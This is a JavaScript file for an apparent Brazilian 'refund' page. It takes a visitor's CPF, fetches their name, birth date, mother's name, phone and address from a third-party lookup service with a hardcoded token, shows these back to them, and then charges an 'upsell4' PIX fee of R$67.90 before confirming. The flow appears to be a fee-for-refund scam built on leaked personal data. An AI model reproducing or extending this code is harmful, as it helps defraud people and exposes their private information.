import { initUtmTracking, redirectWithUtm } from './utm-helper.js';
import { getOrGeneratePix, clearOldCache } from './pix-preloader.js';

// Limpa cache antigo se necessário
clearOldCache();

// Inicializa tracking de UTM
initUtmTracking();

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

let userData = null;
let transactionId = null;
let checkPaymentInterval = null;

document.addEventListener('DOMContentLoaded', () => {
  const refundButton = document.getElementById('refund-button');
  const backButton = document.getElementById('back-to-main');
  const refundForm = document.getElementById('refund-form');
  const confirmButton = document.getElementById('confirm-button');
  const cpfInput = document.getElementById('cpf-input');

  refundButton.addEventListener('click', showFormScreen);
  backButton.addEventListener('click', showMainScreen);
  refundForm.addEventListener('submit', handleFormSubmit);
  confirmButton.addEventListener('click', handleConfirmation);

  cpfInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 11) {
      value = value.slice(0, 11);
    }

    if (value.length > 9) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    } else if (value.length > 6) {
      value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
    } else if (value.length > 3) {
      value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
    }

    e.target.value = value;
  });
});

function showFormScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'block';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('pix-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'none';
}

function showMainScreen() {
  document.getElementById('main-screen').style.display = 'block';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('pix-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'none';
}

function showConfirmationScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'block';
  document.getElementById('pix-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'none';
}

function showPixScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('pix-screen').style.display = 'block';
  document.getElementById('success-screen').style.display = 'none';
}

function showSuccessScreen() {
  document.getElementById('main-screen').style.display = 'none';
  document.getElementById('form-screen').style.display = 'none';
  document.getElementById('confirmation-screen').style.display = 'none';
  document.getElementById('pix-screen').style.display = 'none';
  document.getElementById('success-screen').style.display = 'block';

  // Redirecionar para página de confirmação após 2 segundos
  setTimeout(() => {
    redirectWithUtm('confirmacao.html');
  }, 2000);
}

async function handleFormSubmit(e) {
  e.preventDefault();

  const cpf = document.getElementById('cpf-input').value.replace(/\D/g, '');
  const email = document.getElementById('email-input').value;

  if (!cpf || cpf.length !== 11) {
    alert('Por favor, insira um CPF válido.');
    return;
  }

  if (!email || !email.includes('@')) {
    alert('Por favor, insira um e-mail válido.');
    return;
  }

  const submitButton = document.getElementById('submit-form-button');
  submitButton.disabled = true;
  submitButton.textContent = 'Consultando dados...';

  try {
    const response = await fetch(
      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=5y61eukw00cavxof9866lj`
    );

    if (!response.ok) {
      throw new Error('Erro ao consultar CPF');
    }

    const data = await response.json();

    userData = {
      ...data,
      email: email
    };

    displayConfirmationData(userData);
    showConfirmationScreen();

  } catch (error) {
    console.error('Erro ao consultar CPF:', error);
    alert('Erro ao consultar dados. Por favor, tente novamente.');
  } finally {
    submitButton.disabled = false;
    submitButton.textContent = 'Confirmar dados';
  }
}

function displayConfirmationData(data) {
  const container = document.getElementById('confirmation-data');

  const fields = [
    { label: 'Nome', value: data.nome || 'Não informado' },
    { label: 'CPF', value: formatCPF(data.cpf) || 'Não informado' },
    { label: 'E-mail', value: data.email || 'Não informado' },
    { label: 'Data de Nascimento', value: formatDate(data.nascimento) || 'Não informado' },
    { label: 'Nome da Mãe', value: data.mae || 'Não informado' },
    { label: 'Telefone', value: data.telefone || 'Não informado' },
    { label: 'Endereço', value: formatAddress(data) || 'Não informado' }
  ];

  container.innerHTML = fields.map(field => `
    <div class="confirmation-row">
      <span class="confirmation-label">${field.label}</span>
      <span class="confirmation-value">${field.value}</span>
    </div>
  `).join('');
}

function formatCPF(cpf) {
  if (!cpf) return '';
  const cleaned = cpf.replace(/\D/g, '');
  return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function formatDate(date) {
  if (!date) return '';
  if (date.includes('/')) return date;

  const cleaned = date.replace(/\D/g, '');
  if (cleaned.length === 8) {
    return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}/${cleaned.substring(4, 8)}`;
  }
  return date;
}

function formatAddress(data) {
  const parts = [];

  if (data.logradouro) parts.push(data.logradouro);
  if (data.numero) parts.push(`nº ${data.numero}`);
  if (data.bairro) parts.push(data.bairro);
  if (data.cidade) parts.push(data.cidade);
  if (data.estado) parts.push(data.estado);
  if (data.cep) parts.push(`CEP: ${data.cep}`);

  return parts.join(', ') || '';
}

async function handleConfirmation() {
  const confirmButton = document.getElementById('confirm-button');
  confirmButton.disabled = true;
  confirmButton.textContent = 'Processando...';

  try {
    showPixScreen();
    const pixData = await createPixPayment();
    handlePixSuccess(pixData);
  } catch (error) {
    console.error('Erro ao gerar PIX:', error);
    showError('Erro ao gerar PIX. Por favor, tente novamente.');
  } finally {
    confirmButton.disabled = false;
    confirmButton.textContent = 'Confirmar e enviar';
  }
}

function showError(message) {
  document.getElementById('loading').style.display = 'none';
  const errorElement = document.getElementById('error-message');
  errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
  errorElement.style.display = 'block';
}

async function createPixPayment() {
  try {
    const loadingText = document.getElementById('loading-text');
    if (loadingText) loadingText.textContent = 'Gerando QRCode de pagamento...';

    const pixData = await getOrGeneratePix('upsell4', 6790);
    return pixData;
  } catch (error) {
    console.error('Erro ao criar PIX:', error);
    throw error;
  }
}

function handlePixSuccess(data) {
  console.log('PIX gerado com sucesso:', data);

  transactionId = data.transactionId;

  document.getElementById('loading').style.display = 'none';
  document.getElementById('payment-content').style.display = 'block';

  document.getElementById('amount').textContent = `R$ ${data.amount.toFixed(2).replace('.', ',')}`;

  if (data.expirationDate) {
    const expirationDate = new Date(data.expirationDate);
    const formattedDate = expirationDate.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
    document.getElementById('expiration').textContent = formattedDate;
  } else {
    const expirationDate = new Date(Date.now() + 30 * 60000);
    const formattedDate = expirationDate.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
    document.getElementById('expiration').textContent = formattedDate;
  }

  document.getElementById('pix-code').value = data.qrcode;

  if (data.qrcodeImageUrl) {
    const qrcodeContainer = document.getElementById('qrcode');
    const img = document.createElement('img');
    img.src = data.qrcodeImageUrl;
    img.alt = 'QR Code PIX';
    img.style.width = '200px';
    img.style.height = '200px';
    qrcodeContainer.appendChild(img);
    console.log('QR code pré-renderizado carregado do cache');
  } else if (typeof QRCode !== 'undefined' && QRCode.toCanvas) {
    const canvas = document.createElement('canvas');
    document.getElementById('qrcode').appendChild(canvas);

    QRCode.toCanvas(canvas, data.qrcode, {
      width: 200,
      margin: 2,
      color: {
        dark: '#000000',
        light: '#ffffff'
      }
    }, function(error) {
      if (error) {
        console.error('Erro ao gerar QRCode:', error);
        showQRCodeImage(data.qrcode);
      }
    });
  } else {
    showQRCodeImage(data.qrcode);
  }

  document.getElementById('copy-btn').addEventListener('click', function() {
    const pixCode = document.getElementById('pix-code');
    pixCode.select();
    pixCode.setSelectionRange(0, 99999);

    navigator.clipboard.writeText(pixCode.value).then(() => {
      const copyBtn = document.getElementById('copy-btn');
      copyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
      copyBtn.classList.add('copied');

      setTimeout(function() {
        copyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>';
        copyBtn.classList.remove('copied');
      }, 2000);
    }).catch(err => {
      console.error('Erro ao copiar:', err);
    });
  });

  if (transactionId) {
    iniciarVerificacaoPagamento(transactionId);
  }
}

function showQRCodeImage(qrcode) {
  const qrcodeImg = document.getElementById('qrcode-img');
  qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(qrcode)}&size=200`;
  qrcodeImg.style.display = 'block';
  document.getElementById('qrcode').style.display = 'none';
}

async function verificarPagamento(idTransacao) {
  try {
    const apiUrl = `${SUPABASE_URL}/functions/v1/check-payment`;
    const headers = {
      'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      'Content-Type': 'application/json',
    };

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({ transactionId: idTransacao }),
      signal: AbortSignal.timeout(10000)
    });

    const data = await response.json();

    if (data.status === 'paid' || data.status === 'approved') {
      return true;
    }

    return false;
  } catch (error) {
    console.error('[Pagamento Upsell4] Erro ao verificar pagamento:', error);
    return false;
  }
}

function iniciarVerificacaoPagamento(idTransacao) {
  if (checkPaymentInterval) {
    clearInterval(checkPaymentInterval);
  }

  console.log(`[Pagamento Upsell4] Iniciando verificação de pagamento para transação: ${idTransacao}`);

  let attempts = 0;
  const maxAttempts = 120;

  checkPaymentInterval = setInterval(async () => {
    attempts++;

    if (attempts >= maxAttempts) {
      console.log(`[Pagamento Upsell4] Máximo de tentativas (${maxAttempts}) atingido`);
      clearInterval(checkPaymentInterval);
      return;
    }

    console.log(`[Pagamento Upsell4] Tentativa ${attempts}/${maxAttempts}`);
    const isPaid = await verificarPagamento(idTransacao);

    if (isPaid) {
      console.log('[Pagamento Upsell4] Pagamento confirmado! Exibindo tela de obrigado...');
      clearInterval(checkPaymentInterval);
      showSuccessScreen();
    }
  }, 3000);
}

window.addEventListener('beforeunload', () => {
  if (checkPaymentInterval) {
    clearInterval(checkPaymentInterval);
  }
});

document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    console.log('[Pagamento Upsell4] Página em background - polling continua');
  } else {
    console.log('[Pagamento Upsell4] Página voltou ao foco');
  }
});
